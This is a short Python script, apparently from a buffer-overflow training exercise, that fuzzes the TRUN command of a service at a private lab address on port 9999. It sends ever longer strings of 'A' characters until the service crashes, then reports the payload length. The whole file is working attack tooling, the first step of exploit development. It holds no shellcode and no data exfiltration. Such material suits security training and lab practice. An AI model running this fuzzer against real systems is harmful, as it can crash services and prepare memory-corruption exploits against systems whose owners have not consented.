import socket, sys
from time import sleep
payload=b"A"*100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.141", 9999))
        s.send((b"TRUN /.:/"+payload))
        sleep(1)
        payload=payload+b"A"*100
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit() 
